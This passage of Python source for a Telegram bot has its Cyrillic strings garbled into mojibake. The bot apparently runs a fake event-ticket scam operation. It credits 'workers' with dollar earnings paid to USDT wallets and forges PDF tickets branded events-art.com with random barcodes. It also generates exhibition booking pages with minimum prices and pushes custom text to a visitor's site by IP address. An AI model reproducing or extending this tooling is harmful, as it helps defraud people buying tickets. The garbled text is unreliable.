    await call.message.answer("–í–æ–∑–≤—Ä–∞—Ç –≤ –∞–¥–º–∏–Ω-–ø–∞–Ω–µ–ª—å.", reply_markup=admin_panel_kb)
    await call.answer()

# --- –í—ã–ø–ª–∞—Ç—ã ---
@router.message(lambda m: user_step.get(m.from_user.id) == 'pay_user')
@ban_guard
async def admin_pay_user_profile(message: types.Message):
    if message.text and (message.text.lower() == '–æ—Ç–º–µ–Ω–∞' or message.text.lower() == '‚ùå –æ—Ç–º–µ–Ω–∞'):
        uid = message.from_user.id
        user_step[uid] = None
        user_data[uid] = {}
        kb = admin_menu_kb if is_admin(uid) else main_menu_kb
        await message.answer('–î—ñ—è —Å–∫–∞—Å–æ–≤–∞–Ω–∞. –í–∏ –ø–æ–≤–µ—Ä–Ω—É—Ç—ñ —É –≥–æ–ª–æ–≤–Ω–µ –º–µ–Ω—é.', reply_markup=kb)
        return
    uid = message.from_user.id
    nickname = message.text.strip().lstrip('@')
    c = conn.cursor()
    c.execute('SELECT user_id FROM users WHERE LOWER(username)=?', (nickname.lower(),))
    row = c.fetchone()
    if not row:
        await message.answer("–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —Å —Ç–∞–∫–∏–º –ø—Å–µ–≤–¥–æ–Ω–∏–º–æ–º –Ω–µ –Ω–∞–π–¥–µ–Ω. –í–≤–µ–¥–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π –ø—Å–µ–≤–¥–æ–Ω–∏–º –µ—â—ë —Ä–∞–∑:")
        return
    target_id = row[0]
    db_user = get_user(target_id)
    if not db_user:
        await message.answer("–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –ø—Ä–æ—Ñ–∏–ª—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –ø–æ–∑–∂–µ.")
        return
    nick = db_user.get('username') or db_user['form_json'].get('username') or target_id
    join_date = db_user['last_submit'][:10] if db_user.get('last_submit') else "-"
    if join_date != "-":
        try:
            join_date = datetime.fromisoformat(db_user['last_submit']).strftime('%d-%m-%Y')
        except Exception:
            pass
    earned_total = db_user['form_json'].get('earned_total', 0)
    earned_june = db_user['form_json'].get('earned_june', 0)
    wallet = db_user['form_json'].get('wallet', None)
    wallet_str = wallet if wallet else '<b>–ù–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω</b> <b>‚ùóÔ∏è</b>'
    text = (
        '¬´<b>–í–∞—à –ø—Ä–æ—Ñ–∏–ª—å:</b>¬ª\n'
        f'<b>–ü—Å–µ–≤–¥–æ–Ω–∏–º:</b> <code>#{nick}</code>\n'
        f'<b>–î–∞—Ç–∞ –≤—Å—Ç—É–ø–ª–µ–Ω–∏—è:</b> <code>{join_date}</code>\n'
        'üí∞ <b>–ó–∞—Ä–∞–±–æ—Ç–∞–Ω–æ:</b>\n'
        f'‚îú <b>–í—Å–µ–≥–æ:</b> <code>{earned_total}$</code>\n'
        f'‚îî <b>–ó–∞ –∏—é–Ω—å:</b> <code>{earned_june}$</code>\n'
        'üí≥ <b>USDT BEP-20 –∫–æ—à–µ–ª–µ–∫:</b>\n‚îî {wallet_str}'
    )
    user_data[uid] = {'pay_target': target_id, 'pay_username': nick}
    await message.answer(text, parse_mode='HTML', reply_markup=admin_pay_kb(nick))
    user_step[uid] = 'pay_user_profile'

@router.callback_query(lambda c: c.data.startswith('pay_add:') or c.data.startswith('pay_sub:'))
async def admin_pay_action(call: types.CallbackQuery):
    uid = call.from_user.id
    data = call.data
    if data.startswith('pay_add:'):
        action = 'pay_add'
        nickname = data.split(':', 1)[1]
    else:
        action = 'pay_sub'
        nickname = data.split(':', 1)[1]
    user_data[uid]['pay_action'] = action
    user_data[uid]['pay_username'] = nickname
    user_step[uid] = 'pay_amount'
    await call.message.answer("–í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É:")
    await call.answer()

@router.message(lambda m: user_step.get(m.from_user.id) == 'pay_amount')
@ban_guard
async def admin_pay_amount(message: types.Message):
    if message.text and (message.text.lower() == '–æ—Ç–º–µ–Ω–∞' or message.text.lower() == '‚ùå –æ—Ç–º–µ–Ω–∞'):
        uid = message.from_user.id
        user_step[uid] = None
        user_data[uid] = {}
        kb = admin_menu_kb if is_admin(uid) else main_menu_kb
        await message.answer('–î—ñ—è —Å–∫–∞—Å–æ–≤–∞–Ω–∞. –í–∏ –ø–æ–≤–µ—Ä–Ω—É—Ç—ñ —É –≥–æ–ª–æ–≤–Ω–µ –º–µ–Ω—é.', reply_markup=kb)
        return
    uid = message.from_user.id
    try:
        amount = float(message.text.strip().replace(',', '.'))
    except Exception:
        await message.answer("–í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É —á–∏—Å–ª–æ–º!")
        return
    action = user_data[uid].get('pay_action')
    username = user_data[uid].get('pay_username')
    c = conn.cursor()
    c.execute('SELECT user_id, username, form_json FROM users')
    found = None
    for row in c.fetchall():
        user_id, db_username, form_json = row
        form_json = json.loads(form_json) if form_json else {}
        nick = db_username or form_json.get('username')
        if (db_username and db_username.lower() == username.lower()) or (nick and nick.lower() == username.lower()):
            found = (user_id, db_username, form_json)
            break
    if not found:
        await message.answer("–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ –Ω–∞–π–¥–µ–Ω.")
        user_step[uid] = None
        return
    target_id, db_username, form_json = found
    if action == 'pay_add':
        form_json['earned_total'] = form_json.get('earned_total', 0) + amount
        await message.answer(f"–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é @{username} –Ω–∞—á–∏—Å–ª–µ–Ω–æ {amount}$.")
    else:
        form_json['earned_total'] = max(0, form_json.get('earned_total', 0) - amount)
        await message.answer(f"–° –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è @{username} —Å–Ω—è—Ç–æ {amount}$.")
    c.execute('UPDATE users SET form_json=? WHERE user_id=?', (json.dumps(form_json), target_id))
    conn.commit()
    # –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –ø—Ä–æ—Ñ–∏–ª—å —Å–Ω–æ–≤–∞
    earned_total = form_json.get('earned_total', 0)
    earned_june = form_json.get('earned_june', 0)
    wallet = form_json.get('wallet', None)
    wallet_str = wallet if wallet else '<b>–ù–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω</b> <b>‚ùóÔ∏è</b>'
    nick = db_username or form_json.get('username') or target_id
    text = (
        f'–ü—Ä–æ—Ñ–∏–ª—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è <b>@{nick}</b>\n'
        f'üí∞ <b>–ó–∞—Ä–∞–±–æ—Ç–∞–Ω–æ:</b>\n'
        f'‚îú <b>–í—Å–µ–≥–æ:</b> <code>{earned_total}$</code>\n'
        f'‚îî <b>–ó–∞ –∏—é–Ω—å:</b> <code>{earned_june}$</code>\n'
        f'üí≥ <b>USDT BEP-20 –∫–æ—à–µ–ª–µ–∫:</b>\n‚îî {wallet_str}'
    )
    await message.answer(text, parse_mode='HTML', reply_markup=admin_pay_kb(nick))
    user_step[uid] = None

@router.callback_query(lambda c: c.data == "pay_back")
async def pay_back_handler(call: types.CallbackQuery):
    uid = call.from_user.id
    user_step[uid] = 'admin_panel'
    await call.message.answer("–í–æ–∑–≤—Ä–∞—Ç –≤ –∞–¥–º–∏–Ω-–ø–∞–Ω–µ–ª—å.", reply_markup=admin_panel_kb)
    await call.answer()

# --- –ë–ª–æ–∫–∏—Ä–æ–≤–∫–∞/—Ä–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∫–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π ---
@router.message(lambda m: user_step.get(m.from_user.id) == 'ban_unban_user')
@ban_guard
async def ban_unban_username(message: types.Message):
    if message.text and (message.text.lower() == '–æ—Ç–º–µ–Ω–∞' or message.text.lower() == '‚ùå –æ—Ç–º–µ–Ω–∞'):
        uid = message.from_user.id
        user_step[uid] = None
        user_data[uid] = {}
        kb = admin_menu_kb if is_admin(uid) else main_menu_kb
        await message.answer('–î—ñ—è —Å–∫–∞—Å–æ–≤–∞–Ω–∞. –í–∏ –ø–æ–≤–µ—Ä–Ω—É—Ç—ñ —É –≥–æ–ª–æ–≤–Ω–µ –º–µ–Ω—é.', reply_markup=kb)
        return
    uid = message.from_user.id
    username = message.text.strip().lstrip('@')
    c = conn.cursor()
    c.execute('SELECT user_id, form_json FROM users WHERE LOWER(username)=?', (username.lower(),))
    row = c.fetchone()
    if not row:
        kb = InlineKeyboardMarkup(
            inline_keyboard=[
                [InlineKeyboardButton(text="‚¨ÖÔ∏è –ù–∞–∑–∞–¥", callback_data="ban_back")]
            ]
        )
        await message.answer("–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —Å —Ç–∞–∫–∏–º username –Ω–µ –Ω–∞–π–¥–µ–Ω. –í–≤–µ–¥–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π username –∏–ª–∏ –Ω–∞–∂–º–∏—Ç–µ –∫–Ω–æ–ø–∫—É –Ω–∏–∂–µ.", reply_markup=kb)
        return
    target_id, form_json = row
    form_json = json.loads(form_json) if form_json else {}
    reason = form_json.get('ban_reason', '–ù–µ —É–∫–∞–∑–∞–Ω–∞') if form_json.get('banned', False) else ''
    text = f"–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–∞–π–¥–µ–Ω.\n–°—Ç–∞—Ç—É—Å: {'<b>–ó–∞–±–∞–Ω–µ–Ω</b>' if form_json.get('banned', False) else '<b>–ù–µ –∑–∞–±–∞–Ω–µ–Ω</b>'}"
    if form_json.get('banned', False):
        text += f"\n–ü—Ä–∏—á–∏–Ω–∞: <b>{reason}</b>"
    kb = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="–ó–∞–±–∞–Ω–∏—Ç—å", callback_data=f"ban:{target_id}"),
             InlineKeyboardButton(text="–†–∞–∑–±–∞–Ω–∏—Ç—å", callback_data=f"unban:{target_id}")],
            [InlineKeyboardButton(text="‚¨ÖÔ∏è –ù–∞–∑–∞–¥", callback_data="ban_back")]
        ]
    )
    await message.answer(text, parse_mode='HTML', reply_markup=kb)
    user_data[uid] = {'ban_target': target_id}
    user_step[uid] = 'ban_wait_action'

@router.callback_query(lambda c: c.data.startswith('ban:'))
async def ban_reason_ask(call: types.CallbackQuery):
    uid = call.from_user.id
    target_id = int(call.data.split(':', 1)[1])
    user_data[uid] = {'ban_target': target_id}
    user_step[uid] = 'ban_reason'
    await call.message.answer("–í–≤–µ–¥–∏—Ç–µ –ø—Ä–∏—á–∏–Ω—É –±–ª–æ–∫–∏—Ä–æ–≤–∫–∏:")
    await call.answer()

@router.message(lambda m: user_step.get(m.from_user.id) == 'ban_reason')
@ban_guard
async def ban_save(message: types.Message):
    if message.text and (message.text.lower() == '–æ—Ç–º–µ–Ω–∞' or message.text.lower() == '‚ùå –æ—Ç–º–µ–Ω–∞'):
        uid = message.from_user.id
        user_step[uid] = None
        user_data[uid] = {}
        kb = admin_menu_kb if is_admin(uid) else main_menu_kb
        await message.answer('–î—ñ—è —Å–∫–∞—Å–æ–≤–∞–Ω–∞. –í–∏ –ø–æ–≤–µ—Ä–Ω—É—Ç—ñ —É –≥–æ–ª–æ–≤–Ω–µ –º–µ–Ω—é.', reply_markup=kb)
        return
    uid = message.from_user.id
    reason = message.text.strip()
    target_id = user_data[uid]['ban_target']
    db_user = get_user(target_id)
    form_json = db_user['form_json'] if db_user else {}
    form_json['banned'] = True
    form_json['ban_reason'] = reason
    c = conn.cursor()
    c.execute('UPDATE users SET form_json=? WHERE user_id=?', (json.dumps(form_json), target_id))
    conn.commit()
    await message.answer(f"–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω. –ü—Ä–∏—á–∏–Ω–∞: <b>{reason}</b>", parse_mode='HTML', reply_markup=admin_panel_kb)
    user_step[uid] = 'admin_panel'

@router.callback_query(lambda c: c.data.startswith('unban:'))
async def unban_user(call: types.CallbackQuery):
    uid = call.from_user.id
    target_id = int(call.data.split(':', 1)[1])
    db_user = get_user(target_id)
    form_json = db_user['form_json'] if db_user else {}
    form_json['banned'] = False
    form_json['ban_reason'] = ''
    c = conn.cursor()
    c.execute('UPDATE users SET form_json=? WHERE user_id=?', (json.dumps(form_json), target_id))
    conn.commit()
    await call.message.answer("–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —Ä–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω.", reply_markup=admin_panel_kb)
    user_step[uid] = 'admin_panel'
    await call.answer()

@router.callback_query(lambda c: c.data == "ban_back")
async def ban_back_handler(call: types.CallbackQuery):
    uid = call.from_user.id
    user_step[uid] = 'admin_panel'
    await call.message.answer("–í–æ–∑–≤—Ä–∞—Ç –≤ –∞–¥–º–∏–Ω-–ø–∞–Ω–µ–ª—å.", reply_markup=admin_panel_kb)
    await call.answer()

# --- –ë–∏–ª–µ—Ç—ã ---
@router.message(lambda m: m.text == "üé´–ë–∏–ª–µ—Ç—ã")
@ban_guard
async def tickets_message(message: types.Message):
    uid = message.from_user.id
    # –°–ø–æ—á–∞—Ç–∫—É –≤–∏–¥–∞–ª—è—î–º–æ –∫–ª–∞–≤—ñ–∞—Ç—É—Ä—É —á–µ—Ä–µ–∑ –Ω–µ-–ø–æ—Ä–æ–∂–Ω—î –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è
    await message.answer("–í–≤–µ–¥—ñ—Ç—å –¥–∞–Ω—ñ –¥–ª—è –∫–≤–∏—Ç–∫–∞:", reply_markup=ReplyKeyboardRemove())
    text = (
        "–í–≤–µ–¥–∏—Ç–µ –¥–∞–Ω–Ω—ã–µ –ø–æ —Å–ª–µ–¥—É—é—â–µ–º—É –æ–±—Ä–∞–∑—Ü—É:\n"
        "‚îî –§–æ—Ä–º–∞—Ç –¥–∞—Ç—ã: 01/01/2025\n"
        "‚îî –§–æ—Ä–º–∞—Ç –≤—Ä–µ–º–µ–Ω–∏: 10:00-22:00\n\n"
        "1. –ò–º—è —Ñ–∞–º–∏–ª–∏—è\n"
        "2. –í—Ä–µ–º—è\n"
        "3. –î–∞—Ç–∞\n"
        "4. –¶–µ–Ω–∞ + –≤–∞–ª—é—Ç–∞\n"
        "5. –ê–¥—Ä–µ—Å"
    )
    kb = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="‚ùå –û—Ç–º–µ–Ω–∞", callback_data="tickets_cancel")]
        ]
    )
    await message.answer(text, reply_markup=kb)
    user_step[uid] = 'ticket_input'

TICKETS_DIR = 'tickets'
os.makedirs(TICKETS_DIR, exist_ok=True)

@router.message(lambda m: user_step.get(m.from_user.id) == 'ticket_input')
async def ticket_input_handler(message: types.Message):
    uid = message.from_user.id
    ticket_text = message.text.strip()
    lines = [l for l in ticket_text.split('\n') if l.strip()]
    if len(lines) < 5:
        await message.answer("–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ –≤—Å–µ –¥–∞–Ω–Ω—ã–µ –ø–æ –æ–±—Ä–∞–∑—Ü—É (5 —Å—Ç—Ä–æ–∫, –∫–∞–∂–¥–∞—è —Å –Ω–æ–≤–æ–π —Å—Ç—Ä–æ–∫–∏). –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –µ—â—ë —Ä–∞–∑.")
        return
    name, time, date, price, address = lines[:5]
    # –ì–µ–Ω–µ—Ä–∏—Ä—É–µ–º —É–Ω–∏–∫–∞–ª—å–Ω—ã–π order_id
    order_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))
    pdf_filename = f"order_{order_id}.pdf"
    pdf_path = os.path.join(TICKETS_DIR, pdf_filename)
    # –ì–µ–Ω–µ—Ä–∏—Ä—É–µ–º —à—Ç—Ä–∏—Ö–∫–æ–¥
    barcode_value = ''.join(random.choices(string.digits, k=16))
    barcode_path = os.path.join(TICKETS_DIR, f"barcode_{order_id}.png")
    barcode_img = barcode.get('code128', barcode_value, writer=ImageWriter())
    barcode_img.save(barcode_path)
    # –ö–∞—Ä—Ç–∏–Ω–∫–∞ –¥–ª—è –±–∏–ª–µ—Ç–∞ (–º–æ–∂–Ω–æ –∑–∞–º–µ–Ω–∏—Ç—å –Ω–∞ —Å–≤–æ—é)
    img_path = os.path.join('events-art.com', 'image', 'news_5_1.jpg')
    if not os.path.exists(img_path):
        img_path = os.path.join('events-art.com', 'image', 'news_6_1.webp')
    # –ì–µ–Ω–µ—Ä–∏—Ä—É–µ–º PDF (—Å—Ç–∏–ª—å –∫–∞–∫ –Ω–∞ —Å–∫—Ä–∏–Ω–µ)
    c = canvas.Canvas(pdf_path, pagesize=A4)
    width, height = A4
    # –í–µ—Ä—Ö–Ω–∏–π –¥–æ–º–µ–Ω
    c.setFont("Helvetica-Bold", 18)
    c.setFillColorRGB(0.7,0.7,0.7)
    c.drawString(40, height-40, "events-art.com")
    # –ò–º—è –∫—Ä—É–ø–Ω–æ
    c.setFont("Helvetica-Bold", 22)
    c.setFillColorRGB(0,0,0)
    c.drawString(40, height-70, name)
    # –ö–∞—Ä—Ç–∏–Ω–∫–∞ –ø–æ —Ü–µ–Ω—Ç—Ä—É
    try:
        img = Image.open(img_path)
        img.thumbnail((400, 200))
        img_io = ImageReader(img)
        c.drawImage(img_io, (width-400)//2, height-320, width=400, height=200)
    except Exception:
        pass
    # PRICE/DATE/TIME –±–ª–æ–∫
    c.setFont("Helvetica-Bold", 14)
    c.drawString(60, height-340, f"PRICE: {price}")
    c.drawString(200, height-340, f"DATE: {date}")
    c.drawString(340, height-340, f"TIME: {time}")
    # Location
    c.setFont("Helvetica-Bold", 16)
    c.drawString(60, height-380, f"Location: {address if address else '?????'}")
    # –®—Ç—Ä–∏—Ö–∫–æ–¥
    try:
        c.drawImage(barcode_path, 60, height-500, width=400, height=60)
    except Exception:
        pass
    c.setFont("Helvetica", 12)
    c.drawString(60, height-515, barcode_value)
    c.save()
    # –§–æ—Ä–º–∏—Ä—É–µ–º —Å—Å—ã–ª–∫—É (events-art.com)
    ticket_url = f"https://events-art.com/file/ticket/{pdf_filename}"
    # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º PDF-—Ñ–∞–π–ª –≤ —á–∞—Ç —Å –ø–æ–¥–ø–∏—Å—å—é
    with open(pdf_path, "rb") as pdf_file:
        await message.answer_document(pdf_file, caption=f"{pdf_filename}")
    # –û—Ç–¥–µ–ª—å–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å—Å—ã–ª–∫—É
    await message.answer(ticket_url)
    user_step[uid] = None

@router.callback_query(lambda c: c.data == "tickets_cancel")
async def tickets_cancel_handler(call: types.CallbackQuery):
    uid = call.from_user.id
    user_step[uid] = None
    user_data[uid] = {}
    kb = admin_menu_kb if is_admin(uid) else main_menu_kb
    await call.message.answer('–î—ñ—è —Å–∫–∞—Å–æ–≤–∞–Ω–∞. –í–∏ –ø–æ–≤–µ—Ä–Ω—É—Ç—ñ —É –≥–æ–ª–æ–≤–Ω–µ –º–µ–Ω—é.', reply_markup=kb)
    await call.answer()

# --- –•–µ–Ω–¥–ª–µ—Ä –¥–ª—è –∫–Ω–æ–ø–∫–∏ "–°—Å—ã–ª–∫–∏" ---
links_template_kb = ReplyKeyboardMarkup(
    keyboard=[
        [KeyboardButton(text="–®–∞–±–ª–æ–Ω –∑–∞–ø–æ–ª–Ω–µ–Ω–∏—è üìé")],
        [KeyboardButton(text="‚ùå –û—Ç–º–µ–Ω–∞")]
    ],
    resize_keyboard=True
)

@router.message(lambda m: m.text and '—Å—Å—ã–ª–∫–∏' in m.text.lower())
@ban_guard
async def handle_links_button(message: types.Message):
    print("handle_links_button called")
    text = (
        "1Ô∏è‚É£–í–≤–µ–¥–∏—Ç–µ –¥–∞–Ω–Ω—ã–µ –ø–æ —Å–ª–µ–¥—É—é—â–µ–º—É –æ–±—Ä–∞–∑—Ü—É:\n"
        "üìÖ –§–æ—Ä–º–∞—Ç –¥–∞—Ç—ã: 01.01.2025 12:00\n\n"
        "1. –î–∞—Ç–∞/–≤—Ä–µ–º—è Terroir and Traditions\n"
        "2. –î–∞—Ç–∞/–≤—Ä–µ–º—è Collection Co‚Äìselection\n"
        "3. –î–∞—Ç–∞/–≤—Ä–µ–º—è Snucie\n"
        "4. –î–∞—Ç–∞/–≤—Ä–µ–º—è Art that saves lives\n"
        "5. –î–∞—Ç–∞/–≤—Ä–µ–º—è Gotong Royong\n"
        "6. –î–∞—Ç–∞/–≤—Ä–µ–º—è Anna Konik\n"
        "7. –î–∞—Ç–∞/–≤—Ä–µ–º—è Uncensored\n"
        "8. –î–∞—Ç–∞/–≤—Ä–µ–º—è Jacek Adamas\n"
        "9. –í–∞–ª—é—Ç–∞ (PLN,EUR,USD...)\n"
        "10. –ê–¥—Ä–µ—Å –≤—ã—Å—Ç–∞–≤–∫–∏\n"
        "11. –¶–µ–Ω–∞ –∑–∞ –±–∏–ª–µ—Ç\n\n"
        "–ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—Ç–æ–∏–º–æ—Å—Ç—å –æ–¥–Ω–æ–≥–æ –±–∏–ª–µ—Ç–∞ - 40 EUR!\n"
        "–ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—Ç–æ–∏–º–æ—Å—Ç—å –¥–ª—è –ê–≤—Å—Ç—Ä–∞–ª–∏–∏ - 110 AUD"
    )
    await message.answer(text, reply_markup=links_template_kb)
    user_step[message.chat.id] = 'event_all_fields'

@router.message(lambda m: user_step.get(m.from_user.id) == 'event_all_fields' and m.text and '—à–∞–±–ª–æ–Ω' in m.text.lower())
@ban_guard
async def send_fill_template(message: types.Message):
    template = (
        "28.06.2025 10:00-22:00\n"
        "29.06.2025 10:00-22:00\n"
        "30.06.2025 10:00-22:00\n"
        "01.07.2025 10:00-22:00\n"
        "02.07.2025 10:00-22:00\n"
        "03.07.2025 10:00-22:00\n"
        "04.07.2025 10:00-22:00\n"
        "05.07.2025 10:00-22:00\n"
        "EUR\n"
        "plac Stanis≈Çawa Ma≈Çachowskiego 3, 00-916 Warszawa\n"
        "45"
    )
    await message.answer(template, reply_markup=ReplyKeyboardRemove())
    user_step[message.chat.id] = 'event_all_fields'

@router.message(lambda m: user_step.get(m.from_user.id) == 'event_all_fields')
@ban_guard
async def event_all_fields_handler(message: types.Message):
    if message.text and (message.text.lower() == '–æ—Ç–º–µ–Ω–∞' or message.text.lower() == '‚ùå –æ—Ç–º–µ–Ω–∞'):
        uid = message.from_user.id
        user_step[uid] = None
        user_data[uid] = {}
        kb = admin_menu_kb if is_admin(uid) else main_menu_kb
        await message.answer('–î—ñ—è —Å–∫–∞—Å–æ–≤–∞–Ω–∞. –í–∏ –ø–æ–≤–µ—Ä–Ω—É—Ç—ñ —É –≥–æ–ª–æ–≤–Ω–µ –º–µ–Ω—é.', reply_markup=kb)
        return
    # –ò–≥–Ω–æ—Ä–∏—Ä—É–µ–º –ø—É—Å—Ç—ã–µ —Å—Ç—Ä–æ–∫–∏, –æ–±—Ä–µ–∑–∞–µ–º –ø—Ä–æ–±–µ–ª—ã
    lines = [l.strip() for l in message.text.split('\n') if l.strip()]
    if len(lines) != 11:
        await message.answer(f"‚ùóÔ∏è –î–æ–ª–∂–Ω–æ –±—ã—Ç—å —Ä–æ–≤–Ω–æ 11 –Ω–µ–ø—É—Å—Ç—ã—Ö —Å—Ç—Ä–æ–∫! –í—ã –æ—Ç–ø—Ä–∞–≤–∏–ª–∏: {len(lines)}. –°–∫–æ–ø–∏—Ä—É–π—Ç–µ —à–∞–±–ª–æ–Ω –∏ –∑–∞–ø–æ–ª–Ω–∏—Ç–µ –≤—Å–µ –ø–æ–ª—è.")
        return
    # –ü–∞—Ä—Å–∏–º –¥–∞–Ω–Ω—ã–µ
    dates = []
    times = []
    for dt in lines[:8]:
        if ' ' in dt:
            date, time = dt.split(' ', 1)
            dates.append(date)
            times.append(time)
        else:
            await message.answer("‚ùóÔ∏è –ö–∞–∂–¥–∞—è –∏–∑ –ø–µ—Ä–≤—ã—Ö 8 —Å—Ç—Ä–æ–∫ –¥–æ–ª–∂–Ω–∞ —Å–æ–¥–µ—Ä–∂–∞—Ç—å –¥–∞—Ç—É –∏ –≤—Ä–µ–º—è —á–µ—Ä–µ–∑ –ø—Ä–æ–±–µ–ª!")
            return
    currency = lines[8]
    address = lines[9]
    price = lines[10]
    EVENT_user_data[message.chat.id] = {
        'title': '–í—ã—Å—Ç–∞–≤–∫–∞',
        'dates': dates,
        'times': times,
        'currency': currency,
        'address': address,
        'price': price
    }
    await events_save_all(message)
    user_step[message.chat.id] = None

@router.message(lambda m: user_step.get(m.from_user.id) == 'links_template_wait' and m.text and '–æ—Ç–º–µ–Ω–∞' in m.text.lower())
async def cancel_links_template(message: types.Message):
    await message.answer("–î–µ–π—Å—Ç–≤–∏–µ –æ—Ç–º–µ–Ω–µ–Ω–æ.", reply_markup=ReplyKeyboardRemove())
    user_step[message.chat.id] = None

@log_function
async def admin_enter_text(message: types.Message):
    print(f"admin_enter_text called by {message.from_user.id} with text: {message.text}")
    step = user_step[message.from_user.id]
    ip = step.replace("text_for_", "")
    text = message.text
    text_id = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
    requests.post('http://127.0.0.1:8080/set_custom_text', json={'text_id': text_id, 'text': text})
    import aiohttp
    async def set_flag():
        async with aiohttp.ClientSession() as session:
            await session.post('http://127.0.0.1:8080/set_support_flag', json={'ip': ip, 'type': 'text', 'text_id': text_id})
    import asyncio
    asyncio.create_task(set_flag())
    await message.answer("–ö–Ω–æ–ø–∫–∞ –∑ —Ç–µ–∫—Å—Ç–æ–º –∑'—è–≤–∏—Ç—å—Å—è –Ω–∞ —Å–∞–π—Ç—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞.")
    user_step[message.from_user.id] = None

@router.message()
async def block_others(message: types.Message):
    # –Ü–≥–Ω–æ—Ä—É—î–º–æ –≤—Å—ñ –∫—Ä–æ–∫–∏ —Å—Ü–µ–Ω–∞—Ä—ñ—é —ñ–≤–µ–Ω—Ç—ñ–≤ —Ç–∞ –≤—Å—ñ –≤–∞—Ä—ñ–∞–Ω—Ç–∏ –∫–Ω–æ–ø–∫–∏ '–°—Å—ã–ª–∫–∏'
    if message.text and '—Å—Å—ã–ª–∫–∏' in message.text.lower():
        return
    if user_step.get(message.from_user.id) in ['event_title', 'event_dates', 'event_times', 'event_all_fields']:
        return
    uid = message.from_user.id
    db_user = get_user(uid)
    if db_user and db_user['form_json'].get('banned', False):
        await message.answer(
            "–í–∏ –∑–∞–±–ª–æ–∫–æ–≤–∞–Ω—ñ –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–æ–º. –ü—Ä–∏—á–∏–Ω–∞: " + db_user['form_json'].get('ban_reason', '–ù–µ –≤–∫–∞–∑–∞–Ω–∞')
        )
        return
    if message.text in ["‚öôÔ∏è–ú–µ–Ω—é", "üìé–°—Å—ã–ª–∫–∏", "üé´–ë–∏–ª–µ—Ç—ã", "–î–æ–±–∞–≤–∏—Ç—å/–ò–∑–º–µ–Ω–∏—Ç—å –∫–æ—à–µ–ª–µ–∫", "–°–º–µ–Ω–∏—Ç—å –ø—Å–µ–≤–¥–æ–Ω–∏–º"]:
        return
    if message.text and message.text == '/start':
        return
    if is_admin(uid):
        if message.text in ["üõ†Ô∏è –ê–¥–º–∏–Ω –ø–∞–Ω–µ–ª—å", "üö´ –ó–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å / —Ä–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å", "üí∏ –ù–∞—á–∏—Å–ª–∏—Ç—å –≤—ã–ø–ª–∞—Ç—É", "‚¨ÖÔ∏è –ù–∞–∑–∞–¥"]:
            return
        if user_step.get(uid) in ['admin_panel', 'ban_unban_user', 'pay_user', 'pay_user_profile', 'pay_amount']:
            return
    if db_user and db_user['status'] != 'approved':
        if db_user['status'] == 'pending':
            await message.answer("–í–∞—à–∞ –∑–∞—è–≤–∫–∞ —É–∂–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞, –æ–∂–∏–¥–∞–π—Ç–µ –ø—Ä–æ–≤–µ—Ä–∫–∏.")
        elif db_user['status'] == 'rejected':
            if db_user['last_submit']:
                last = datetime.fromisoformat(db_user['last_submit'])
                if datetime.utcnow() - last < timedelta(days=7):
                    next_time = last + timedelta(days=7)
                    await message.answer(f"–í–∞—à–∞ –∑–∞—è–≤–∫–∞ –±—ã–ª–∞ –æ—Ç–∫–ª–æ–Ω–µ–Ω–∞. –ü–æ–≤—Ç–æ—Ä–Ω–æ –ø–æ–¥–∞—Ç—å –∑–∞—è–≤–∫—É –º–æ–∂–Ω–æ {next_time.strftime('%d.%m.%Y %H:%M')}")
                    return
            await message.answer("–í–∞—à–∞ –∑–∞—è–≤–∫–∞ –æ—Ç–∫–ª–æ–Ω–µ–Ω–∞.")
        else:
            await message.answer("–î–ª—è –Ω–∞—á–∞–ª–∞ –∑–∞–ø–æ–ª–Ω–∏—Ç–µ –∞–Ω–∫–µ—Ç—É –∫–æ–º–∞–Ω–¥–æ–π /start")
    elif not db_user:
        await message.answer("–î–ª—è –Ω–∞—á–∞–ª–∞ –∑–∞–ø–æ–ª–Ω–∏—Ç–µ –∞–Ω–∫–µ—Ç—É –∫–æ–º–∞–Ω–¥–æ–π /start")

# --- EVENTS ART BOT (ex-bot.py) ---
